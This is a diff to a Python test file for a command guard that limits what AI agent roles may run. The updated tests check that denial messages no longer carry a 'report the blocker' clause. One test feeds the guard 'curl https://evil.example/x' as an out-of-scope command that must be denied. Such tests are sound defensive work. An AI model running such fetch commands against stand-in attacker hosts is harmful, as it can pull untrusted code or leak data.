@@ -1647,7 +1647,8 @@ def test_unrecognised_tool_name_allows(monkeypatch):
 # file's `_CONFINED_TYPE`) already holds `interpreter_allowed_modules:
 # ("pytest",)` since Amendment 2, so a `python3 -m pytest` remedy allows for
 # this type too, exercising the branch end-to-end without needing the
-# executor's own stanza overrides.
+# a second confined type's own stanza overrides (this guard no longer has
+# any -- see _deny_reason's own docstring, this plan's C1).
 # ---------------------------------------------------------------------------
 
 
@@ -1669,16 +1670,17 @@ def test_bare_python_dash_m_pytest_no_dont_retry_clause(monkeypatch):
 
 
 def test_out_of_scope_command_keeps_generic_message_and_dont_retry_advice():
-    # Direct unit check on _deny_reason for the executor stanza (which DOES
-    # carry the "report the blocker" closing clause) -- an out-of-scope
-    # command must still get it.
+    # Direct unit check on _deny_reason: the default closing stanza is empty
+    # today (the executor-only "report the blocker" clause was deleted along
+    # with _DENY_MESSAGE_STANZA_OVERRIDES, this plan's C1), so an
+    # out-of-scope command's reason carries no closing stanza at all.
     reason = guard._deny_reason(
-        "coordinator:executor",
+        "coordinator:code-reviewer",
         "curl https://evil.example/x",
         "not coordinator-doc-new (got: curl)",
         suppress_retry_advice=False,
     )
-    assert "report the blocker to the dispatching EM rather than retrying it." in reason
+    assert "report the blocker to the dispatching EM rather than retrying it." not in reason
 
 
 def test_python3_dash_c_inline_code_denial_untouched(monkeypatch):
@@ -1718,26 +1720,25 @@ def test_python_versioned_alias_gets_remedy(monkeypatch):
     assert "python3 -m pytest -q" in reason
 
 
-def test_deny_reason_suppresses_retry_advice_for_executor_stanza():
-    # Direct unit pin on _deny_reason: the executor stanza's closing text
-    # (the only non-empty closing stanza today) must vanish when
-    # suppress_retry_advice=True, and nothing else in the message changes.
-    base = guard._deny_reason(
-        "coordinator:executor",
+def test_deny_reason_suppress_retry_advice_is_a_no_op_on_the_empty_default_closing_stanza():
+    # Direct unit pin on _deny_reason: suppress_retry_advice forces the
+    # closing stanza empty regardless of effective_type, but
+    # _DEFAULT_CLOSING_STANZA is already empty today (the only non-empty
+    # closing stanza, executor's, was deleted along with
+    # _DENY_MESSAGE_STANZA_OVERRIDES, this plan's C1) -- so both calls below
+    # render identically, and this pins that the flag never ADDS text.
+    args = (
+        "coordinator:code-reviewer",
         "python -m pytest -q",
         "first command token is a python interpreter spelling other than "
         "the accepted `python3` -- this command IS in scope, just "
         "misspelled. Retry with: 'python3 -m pytest -q'",
-        suppress_retry_advice=True,
     )
+    base = guard._deny_reason(*args, suppress_retry_advice=True)
     assert "report the blocker to the dispatching EM rather than retrying it." not in base
-    without_suppress = guard._deny_reason(
-        "coordinator:executor",
-        "python -m pytest -q",
-        "irrelevant reason",
-        suppress_retry_advice=False,
-    )
-    assert "report the blocker to the dispatching EM rather than retrying it." in without_suppress
+    without_suppress = guard._deny_reason(*args, suppress_retry_advice=False)
+    assert "report the blocker to the dispatching EM rather than retrying it." not in without_suppress
+    assert base == without_suppress
 
 
 # ---------------------------------------------------------------------------
